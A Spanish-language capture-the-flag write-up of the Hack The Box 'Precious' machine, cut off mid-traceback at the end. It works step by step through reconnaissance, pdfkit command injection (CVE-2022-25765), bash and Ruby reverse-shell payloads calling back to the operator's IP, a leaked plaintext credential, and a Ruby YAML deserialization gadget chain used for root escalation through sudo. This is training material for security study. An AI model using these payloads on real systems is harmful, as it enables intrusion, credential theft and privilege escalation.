---
title: "Precious - Hack The Box"
date: 2023-04-10
draft: false
slug: "htb-writeup-precious"
excerpt: "Esta fue una máquina algo difícil, porque no sabía bien como acceder como usuario, trate de cargar un Payload, pero no funciono, estudie el ataque Smuggling para tratar de obtener credenciales, pero no lo entendí del todo bien, intente usar un Exploit para Ruby-on-rails, pero no funciono, por eso tarde bastante en resolverla. En fin, vamos a abusar de la herramienta que genera el el PDF que usa la página web de la máquina, llamado pdfkit, usaremos el Exploit CVE-2022-25765 para acceder a la máquina y robar las credenciales del usuario. Una vez conectados como usuario, abusaremos de un script de Ruby que tiene permisos de SUDO para inyectar código malicioso que nos permita escalar privilegios como root, esto en base al YAML Deserialization."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "pdfkit", "Extracting Metadata", "Fuzzing", "Command Injection (CI)", "CVE-2022-25765 (CI)", "Ruby Enumeration", "Information Leakage", "Privesc - Abusing Sudoers Privileges", "Privesc - YAML Deserialization Attack", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "python3"
  - "nc"
  - "pdfinfo"
  - "python"
  - "exiftool"
  - "wget"
  - "curl"
  - "ssh"
  - "sudo"
  - "bash"
links:
  - "https://github.com/shamo0/PDFkit-CMD-Injection"
  - "https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795"
  - "https://github.com/UNICORDev/exploit-CVE-2022-25765"
  - "https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/"
  - "https://portswigger.net/web-security/request-smuggling"
  - "https://snyk.io/test/docker/nginx%3A1.18.0"
  - "https://vuldb.com/?id.155282"
  - "https://book.hacktricks.xyz/v/es/pentesting-web/deserialization/python-yaml-deserialization"
  - "https://es.wikipedia.org/wiki/Nginx"
  - "https://www.phusionpassenger.com/docs/tutorials/what_is_passenger/"
  - "https://kodigo.org/hablemos-de-ruby-on-rails-ruby-on-rails-que-es-y-para-que-sirve/"
  - "https://www.reydes.com/d/?q=pdfinfo"
  - "http://sedici.unlp.edu.ar/bitstream/handle/10915/139859/Presentaci%C3%B3n.pdf?sequence=3&isAllowed=y"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-precious/precious_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.189                        
PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=129 ms
64 bytes from 10.10.11.189: icmp_seq=2 ttl=63 time=130 ms
64 bytes from 10.10.11.189: icmp_seq=3 ttl=63 time=130 ms
64 bytes from 10.10.11.189: icmp_seq=4 ttl=63 time=130 ms

--- 10.10.11.189 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3013ms
rtt min/avg/max/mdev = 129.359/129.769/129.969/0.241 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.189 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 11:49 CST
Initiating SYN Stealth Scan at 11:49
Scanning 10.10.11.189 [65535 ports]
Discovered open port 22/tcp on 10.10.11.189
Discovered open port 80/tcp on 10.10.11.189
Completed SYN Stealth Scan at 11:49, 27.06s elapsed (65535 total ports)
Nmap scan report for 10.10.11.189
Host is up, received user-set (0.89s latency).
Scanned at 2023-04-10 11:49:23 CST for 27s
Not shown: 53229 filtered tcp ports (no-response), 12304 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.30 seconds
           Raw packets sent: 126040 (5.546MB) | Rcvd: 12410 (496.440KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo solamente dos puertos abiertos, como no tenemos credenciales para el SSH, vamos directamente con el puerto HTTP.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p22,80 10.10.11.189 -oN targeted                           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 11:51 CST
Nmap scan report for 10.10.11.189
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)

| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0

|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Bien, ahí nos dice que se esta ocupando un servicio, el **nginx 1.18.0**, y nos menciona que no puede redirigirse al dominio **precious.htb**. Esto ya nos da una idea de lo que esta pasando, así que es momento de analizar la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos.

Al parecer no se puede, ya sabemos qué hacer en estos casos, registremos el dominio en el **/etc/hosts**
```bash
nano /etc/hosts
10.10.11.189 precious.htb
```
Recargamos la página y ahora sí, ya podemos verla.

![](/assets/images/htb-writeup-precious/Captura1.png)

Vale, por lo que nos dice, convierte una página web en un **archivo PDF**, veamos lo que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-precious/Captura2.png">
</p>

Ahí vemos el servicio **nginx 1.18.0**, el servicio **Phusion Passenger** y vemos que la página está hecha en **PHP**, esto nos puede servir más adelante.

Ahora, veamos que nos dice la **herramienta whatweb**:
```bash
whatweb http://10.10.11.189
http://10.10.11.189 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.189], RedirectLocation[http://precious.htb/], Title[302 Found], nginx[1.18.0]
http://precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.10.11.189], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```
Bien, algo interesante que podemos ver, tanto en **Wappalizer** como con **whatweb**, es que utiliza los servidores web de **nginx** y otro llamado **Phusion Passenger**, vamos a investigarlos:

| **Servidor Web nginx** |
|:-----------:|
| *Nginx ​ es un servidor web/Proxy inverso ligero de alto rendimiento y un proxy para protocolos de correo electrónico.​​ Es software libre y de código abierto, licenciado bajo la Licencia BSD simplificada; también existe una versión comercial distribuida bajo el nombre de Nginx Plus.​* |

| **Servidor Web Phusion Passenger** |
|:-----------:|
| *Phusion Passenger es un servidor web gratuito y un servidor de aplicaciones compatible con Ruby, Python y Node.js. Está diseñado para integrarse en el servidor Apache HTTP o el servidor web nginx, pero también tiene un modo para ejecutarse de forma independiente sin un servidor web externo.* |

OK, lo que me da a entender el ultimo servidor web, es que estan utilizando Ruby y Python para el funcionamiento de la página web. Esto nos lo confirma **whatweb**, pues nos muestra que estan ocupando Ruby-on-Rails, veamos de que se trata esto:

| **Ruby-on-Rails** |
|:-----------:|
| *Ruby on Rails, también conocido como RoR o Rails, es un framework de aplicaciones web de código abierto del lado del servidor escrito en el lenguaje de programación Ruby, siguiendo el paradigma del patrón Modelo Vista Controlador.* |

Excelente, ya tenemos bastante información que nos va a ser útil para después. Hagamos **Fuzzing** para ver si hay algo de interés.

### Fuzzing {#Fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://precious.htb/FUZZ/      
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://precious.htb/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000000014:   200        18 L     42 W       483 Ch      "http://precious.htb//"                                              
000045240:   200        18 L     42 W       483 Ch      "http://precious.htb//"                                              
000155453:   503        0 L      29 W       189 Ch      "previousHeaderGraphics"                                             
000155446:   503        0 L      29 W       189 Ch      "newsforgeNewsforge"                                                 
000155438:   503        0 L      29 W       189 Ch      "ps-vir5"                                                            
000155429:   503        0 L      29 W       189 Ch      "ble"                                                                
000155475:   503        0 L      29 W       189 Ch      "40686"                                                              
000155473:   503        0 L      29 W       189 Ch      "data-license"                                                       
000155469:   503        0 L      29 W       189 Ch      "smallright16"
...
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Hay demasiados archivos que, por el código de estado, no podremos ver. Vamos a eliminar ese código de estado y veamos si encuentra algo:

```bash
wfuzz -c --hc=404,503 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://precious.htb/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://precious.htb/FUZZ.php/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000013:   200        18 L     42 W       483 Ch      "#"                                                                   
000000010:   200        18 L     42 W       483 Ch      "#"                                                                   
000000002:   200        18 L     42 W       483 Ch      "#"                                                                   
000000004:   200        18 L     42 W       483 Ch      "#"                                                                   

Total time: 565.2140
Processed Requests: 220560
Filtered Requests: 220547
Requests/sec.: 390.2238
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Mmmmm no nos dio nada, entonces hagamos lo que nos pide.

### Probando el Convertor PDF de la Página Web {#HTTP2}

Tratemos de darle una página cualquiera, puse "hola_mundo" de Wikipedia:

![](/assets/images/htb-writeup-precious/Captura3.png)

No sirvió, vamos a ver que pasa si lo hacemos con una página local, hagámoslo por pasos:

* Abramos un servidor web con **Python**:
```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* Ponemos la IP y el puerto en la página web de la máquina:
```bash
http://Tu_IP:8000/
```

* Le damos click y nos saca el **PDF**:

![](/assets/images/htb-writeup-precious/Captura4.png)

* Descargamos el **PDF** y lo guardamos en nuestro directorio de trabajo.

Bien, si bien podemos ver el contenido del **PDF**, podemos utilizar la herramienta **pdfinfo** o la herramienta **exiftool**.

#### Obteniendo Información y Metadatos de PDF con pdfinfo y exiftool {#HTTP3}

Veamos que hacen estas dos herramientas:

| **Herramienta pdfinfo** |
|:-----------:|
| *Es un extractor de información desde documentos PDF (Portable Document Format). Imprime el contenido del diccionario “Info” (además de alguna otra información útil), desde archivos PDF. Se ejecuta la herramienta únicamente definiendo el nombre del archivo. Lo cual muestra la información del diccionario Info.* |

| **Herramienta exiftool** |
|:-----------:|
| *Es una herramienta de código abierto que permite leer, escribir y editar metadatos de una gran variedad de archivos (EXIF , GPS , IPTC , XMP , JFIF), no tiene interfaz gráfica se ejecuta por línea de comandos.* |

Entonces, ambas herramientas nos dan información especifica de los **archivos PDF**, pero la **herramienta exiftool** me parece más útil para poder ver los medatadatos de cualquier archivo. 

En fin, vamos a probar ambas:

* Probamos primero la **herramienta pdfinfo**:
```bash
pdfinfo n005vxio3bqkzrd9hf90yf60sl0jz8gu.pdf 
Creator:         Generated by pdfkit v0.8.6
Custom Metadata: no
Metadata Stream: yes
Tagged:          no
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           1
Encrypted:       no
Page size:       612 x 792 pts (letter)
Page rot:        0
File size:       18455 bytes
Optimized:       no
PDF version:     1.4
```

* Ahora la **herramienta exiftool**:
```bash
exiftool rw7q7mj6c9pxd8omidlhfvr64ln78637.pdf
ExifTool Version Number         : 12.57
File Name                       : rw7q7mj6c9pxd8omidlhfvr64ln78637.pdf
Directory                       : .
File Size                       : 11 kB
File Modification Date/Time     : 2023:04:10 13:21:27-06:00
File Access Date/Time           : 2023:04:10 13:21:48-06:00
File Inode Change Date/Time     : 2023:04:10 13:22:12-06:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```
Interesante, vemos que utilizaron una herramienta/servicio para crear el **PDF**, quizá exista un Exploit, vamos a buscarlo.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Inyección de Comandos {#pdfkit}

Investigando un poco, nos encontramos con la siguiente página:
* <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795" target="_blank">Command Injection: Affecting pdfkit package, versions <0.8.7.2 </a>

Esta página nos explica como se pueden inyectar comandos dentro de la URL, pues no esta bien sanitizada. Para que podamos realizar nuestras inyecciones, utilizamos el siguiente parámetro dentro de la URL que vamos a usar para convertir en **PDF**: 
```bash
http://ejemplo.com/?name=%20`whoami`
```

Vamos a probarlo, lo haremos por pasos:

* Abre un servidor HTTP con **Python** en tú directorio de trabajo:
```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* Introduce la página local y agrega el parámetro que inyecta el comando:
```bash
http://Tu_IP:8000/?name=%20`whoami`
```

<p align="center">
<img src="/assets/images/htb-writeup-precious/Captura5.png">
</p>

* Observa lo que se obtuvo:

<p align="center">
<img src="/assets/images/htb-writeup-precious/Captura6.png">
</p>

* Ahora inyecta el **comando id** y observa el resultado:

<p align="center">
<img src="/assets/images/htb-writeup-precious/Captura7.png">
</p>

* Observa lo que ocurrio en el servidor HTTP:
```bash
python3 -m http.server 8000   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.189 - - [10/Apr/2023 13:53:41] "GET /?name=%20ruby HTTP/1.1" 200 -
10.10.11.189 - - [10/Apr/2023 13:54:08] "GET /?name=%20uid=1001(ruby)%20gid=1001(ruby)%20groups=1001(ruby) HTTP/1.1" 200 -
```
Curiosamente, el resultado se muestra también desde el servidor HTTP

-------

**Nota**: podríamos intentar capturar todo este proceso en **BurpSuite**, pero hay algo que nos impide inyectar comandos desde ahí, por lo que lo descarte, pero si quieres probar e investigar que es lo que nos impide la inyección de comandos, adelante.

-------

Excelente, de esta forma podemos inyectar comandos, es momento de poner nuestra **Reverse Shell** de confianza para ganar acceso a la máquina:

* No cierres el **servidor HTTP**.

* Abre una **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Inyecta la **Reverse Shell**:
```bash
http://Tu_IP:8000/?name=%20`bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1`
```

* Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.189] 43556
bash: cannot set terminal process group (678): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ whoami
whoami
ruby
ruby@precious:/var/www/pdfapp$ id
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```

### Buscando un Exploit para pdfkit v0.8.6 {#pdfkit2}

A la hora de buscar un Exploit para esta versión de **pdfkit**, se encunetran un par que nos pueden servir mucho:
* <a href="https://github.com/UNICORDev/exploit-CVE-2022-25765" target="_blank">Repositorio de UNICORDev: Exploit for CVE-2022–25765 (pdfkit) - Command Injection</a>
* <a href="https://github.com/shamo0/PDFkit-CMD-Injection" target="_blank">Repositorio de shamo0: PDFkit-CMD-Injection</a>

Vamos a probar ambos, para ver que tal funcionan.

#### Probando Exploit: CVE-2022–25765 (pdfkit) - Command Injection {#pdfkit3}

* Primero vamos a descargar este Exploit:
```bash
wget https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2022-25765/main/exploit-CVE-2022-25765.py
https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2022-25765/main/exploit-CVE-2022-25765.py
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com) conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 7849 (7.7K) [text/plain]
Grabando a: «exploit-CVE-2022-25765.py»
.
exploit-CVE-2022-25765.py            100%[========>]   7.67K  --.-KB/s    en 0s      
.
2023-10-04 14:44:54 (24.0 MB/s) - «exploit-CVE-2022-25765.py» guardado [7849/7849]
```

* Abre una **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Para usarlo, debemos usar el parámetro **-h** y usamos **Python3**:
```bash
python3 exploit-CVE-2022-25765.py -h
UNICORD Exploit for CVE-2022–25765 (pdfkit) - Command Injection
.
Usage:
  python3 exploit-CVE-2022–25765.py -c <command>
  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port>
  python3 exploit-CVE-2022–25765.py -c <command> [-w <http://target.com/index.html> -p <parameter>]
  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port> [-w <http://target.com/index.html> -p <parameter>]
  python3 exploit-CVE-2022–25765.py -h
.
Options:
  -c    Custom command mode. Provide command to generate custom payload with.
  -s    Reverse shell mode. Provide local IP and port to generate reverse shell payload with.
  -w    URL of website running vulnerable pdfkit. (Optional)
  -p    POST parameter on website running vulnerable pdfkit. (Optional)
  -h    Show this help menu.
```

* El mismo Exploit nos ayuda con un ejemplo de su uso, curiosamente, se probo este Exploit en la misma máquina:
```bash
python3 exploit-CVE-2022-25765.py -s Tu_IP 443 -w http://precious.htb -p url
.
        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \

        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
.    
UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Reverse Shell Sent to Target Website Mode
PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("Tu_IP","443"))'`
LOCALIP: Tu_IP:443
WARNING: Be sure to start a local listener on the above IP and port. "nc -lnvp 443".
WEBSITE: http://precious.htb
POSTARG: url
EXPLOIT: Payload sent to website!
SUCCESS: Exploit performed action.
```

* Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.189] 42476
whoami
ruby
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```
Y listo, ganamos acceso otra vez.

#### Probando Exploit: PDFkit-CMD-Injection {#pdfkit4}

Esta vez, nos dan un comando que podemos usar para ganar acceso a la máquina, se trata de un comando curl que manda un petición POST que carga nuestra Reverse Shell, al parecer, solamente debemos indicar nuestra IP y un puerto.

Sigamos las instrucciones que nos dicen:

* Abrimos un servidor web con **Python**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Abrimos una **netcat**:
```bash
nc -nvlp 443         
listening on [any] 443 ...
```

* Cargamos una petición y la modificamos poniendo la dirección de la página web de la máquina y poniendo nuestra IP y un puerto:
```bash
curl 'http://precious.htb/' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://precious.htb/' -H 'Connection: keep-alive' -H 'Referer: http://precious.htb/' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22AQUI_PON_TU_IP%22%2CAQUI_PON_EL_PUERTO%29%29%27%60'  
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
```

* Resultado:
```bash
nc -nvlp 443         
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.189] 34916
whoami
ruby
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```
Estamos dentro otra vez. Diría que busquemos la flag, pero no somos usuarios, vamos a buscar que cosillas encontramos aquí.

## Post Explotación {#Post}

### Enumeración de Usuario Ruby {#Ruby}

Para no mostrar todo lo que vi, que es inútil, voy a poner solo lo interesante.

Entramos en la carpeta **/home** para ver si podemos ver la flag, que te recuerdo, no vamos a poder verla:
```bash
cd /home
ls
henry  
ruby
cd henry        
ls
user.txt
cat user.txt
cat: user.txt: Permission denied
```

Tenemos un usuario, pero no tenemos la contraseña, vamos a ver si hay directorios ocultos de **Ruby** porque del usuario no podremos verlos:
```bash
cd ruby
ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 Apr 10 14:08 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Apr 10 14:08 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
```

Muy bien, si tratamos de ver todos, el que contendrá la contraseña y el usuario, será el directorio oculto **.bundle**:
```bash
cd .bundle
ls -la
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .
drwxr-xr-x 4 ruby ruby 4096 Apr 10 14:08 ..
-r-xr-xr-x 1 root ruby   62 Sep 26  2022 config
```

Excelente, veamos que dice ese archivo **config**:
```bash
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
exit
```
Muy bien, tenemos la contraseña del **usuario henry**.

Es momento de entrar a la máquina por el **servicio SSH**:
```bash
ssh henry@10.10.11.189              
The authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.
ED25519 key fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.189' (ED25519) to the list of known hosts.
henry@10.10.11.189's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$ whoami
henry
henry@precious:~$ ls -la
total 24
drwxr-xr-x 2 henry henry 4096 Oct 26 08:28 .
drwxr-xr-x 4 root  root  4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root  root     9 Sep 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 henry henry  220 Sep 26  2022 .bash_logout
-rw-r--r-- 1 henry henry 3526 Sep 26  2022 .bashrc
-rw-r--r-- 1 henry henry  807 Sep 26  2022 .profile
-rw-r----- 1 root  henry   33 Apr 10 13:40 user.txt
henry@precious:~$ cat user.txt
```

### Enumeración de Usuario Henry {#post}

Veamos que podemos hacer como el **usuario henry**:
```bash
henry@precious:~$ id
uid=1000(henry) gid=1000(henry) groups=1000(henry)
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Tenemos acceso a un archivo que tiene permiso como Root que esta hecho en **Ruby**. Vamos a analizarlo:
```bash
henry@precious:~$ cd /opt
henry@precious:/opt$ ls
sample  update_dependencies.rb
henry@precious:/opt$ cat update_dependencies.rb

# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
Por lo que entiendo, este script en **Ruby**, utiliza un archivo llamado **dependencies.yml** para poder instalar o actualizar la versión de **Ruby** creo.

Dicho archivo de **.yml** es creado con la **librería YAML**, entonces vamos a buscar un Exploit para **YAML**.

### Aplicando YAML Deserialization Attack {#yaml}

Encontré algo llamado **YAML Deserialization**:

| **YAML Deserialization** |
|:-----------:|
| *Se pueden crear payloads personalizados utilizando módulos YAML de Python como PyYAML o ruamel.yaml. Estos payloads pueden explotar vulnerabilidades en sistemas que deserializan entradas no confiables sin una sanitización adecuada.* |

Para más información:
* <a href="https://book.hacktricks.xyz/v/es/pentesting-web/deserialization/python-yaml-deserialization" target="_blank">HackTricks: Python Yaml Deserialization</a>

Pero la siguiente página lo explica mejor:
* <a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/" target="_blank">Blind Remote Code Execution through YAML Deserialization</a>

En resumen, vamos a utilizar la **librería YAML** para ejecutar código malicioso, al momento de que se valide el script **dependencies.yml**. Para hacer esto, debemos crear un archivo del mismo nombre y poner lo siguiente:
```bash
  !ruby/object:Gem::Installer
     i: x
  !ruby/object:Gem::SpecFetcher
     i: y
  !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve
```
Ahora, el que hará la movida para ejecutar código, será este **git_set:**.

Hagamos una prueba con tal de ver como funciona, vamos por pasos:

* Creamos el archivo **dependencies.yml**, OJO, esto solo podremos hacer en la carpeta **henry**:
```bash
henry@precious:/home$ pwd
/home/henry
henry@precious:~$ nano dependencies.yml
```

* Dentro del archivo ponemos el script de arriba y cambiamos el **git_set** por un **whoami** para ver si nos suelta algo:

```bash
  !ruby/object:Gem::Installer
     i: x
  !ruby/object:Gem::SpecFetcher
     i: y
  !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: whoami
          method_id: :resolve
```

* Ejecutamos el script con **permisos SUDO** y veamos que pasa:
```bash
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
root
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
